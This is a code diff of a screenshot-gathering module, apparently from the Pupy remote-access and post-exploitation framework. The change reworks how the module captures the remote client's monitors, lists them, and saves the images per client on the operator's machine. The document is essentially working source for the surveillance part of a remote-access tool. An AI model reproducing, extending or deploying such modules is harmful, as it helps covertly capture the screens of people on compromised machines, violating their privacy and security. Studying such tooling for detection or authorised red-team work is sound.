@@ -1,45 +1,50 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 
 # --------------------------------------------------------------
-# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# All rights reserved.
-# 
-# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
-# 
-# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-# 
-# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-# 
-# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-# 
-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu) All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions are met:
+#
+# 1. Redistributions of source code must retain the above copyright notice,
+# this list of conditions and the following disclaimer.
+#
+# 2. Redistributions in binary form must reproduce the above copyright notice,
+# this list of conditions and the following disclaimer in the documentation
+# and/or other materials provided with the distribution.
+#
+# 3. Neither the name of the copyright holder nor the names of its contributors
+# may be used to endorse or promote products derived from this software without
+# specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+# POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
 from pupylib.PupyModule import *
-import os
-import os.path
-import textwrap
-import logging
+from pupylib.PupyConfig import PupyConfig
+from os import path
+
 import datetime
-from zlib import compress, crc32
-import struct
 import subprocess
 
 __class_name__="Screenshoter"
 
-def pil_save(filename, pixels, width, height):
-    from PIL import Image, ImageFile
-    buffer_len = (width * 3 + 3) & -4
-    img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
-    ImageFile.MAXBLOCK = width * height
-    img=img.transpose(Image.FLIP_TOP_BOTTOM)
-    img.save(filename, quality=95, optimize=True, progressive=True)
-    logging.info('Screenshot saved to %s'%filename)
 
-
-@config(cat="gather", compat="windows")
+@config(cat="gather")
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
+
+    dependencies = ['mss', 'screenshot']
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
@@ -48,29 +53,34 @@ class Screenshoter(PupyModule):
         self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
-        try:
-            os.makedirs(os.path.join("data","screenshots"))
-        except Exception:
-            pass
-        self.client.load_package("pupwinutils.screenshot")
-        screens=None
-        if args.screen is None:
-            screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors(oneshot=True)
-        else:
-            screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors()
+        rscreenshot = self.client.conn.modules['screenshot']
+
         if args.enum:
-            res=""
-            for i, screen in enumerate(screens):
-                res+="{:<3}: {}\n".format(i,screen)
-            return res
-        if args.screen is None:
-            args.screen=0
-        selected_screen=screens[args.screen]
-        screenshot_pixels=self.client.conn.modules["pupwinutils.screenshot"].get_pixels(selected_screen)
-        filepath=os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
-        pil_save(filepath, screenshot_pixels, selected_screen["width"], selected_screen["height"])
-        if args.view:
-            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
-        self.success("screenshot saved to %s"%filepath)
+            self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
+            for i, screen in enumerate(rscreenshot.screens()):
+                if not (screen['width'] and screen['height']):
+                    continue
 
+                self.rawlog('{:>2}: {:>9} {:>9}\n'.format(
+                    i,
+                    '{}x{}'.format(screen['width'], screen['height']),
+                    '({}x{})'.format(screen['top'], screen['left'])))
+            return
 
+        config = PupyConfig()
+        folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+        time = datetime.datetime.now()
+        pattern = path.join(folder, '{}.png')
+
+        screenshot, error = rscreenshot.screenshot(args.screen)
+        if not screenshot:
+            self.error(error)
+        else:
+            output = pattern.format(time)
+            with open(output, 'w') as out:
+                out.write(screenshot)
+                self.success(output)
+
+            if args.view:
+                viewer = config.get('default_viewers', 'image_viewer')
+                subprocess.Popen([viewer, output])
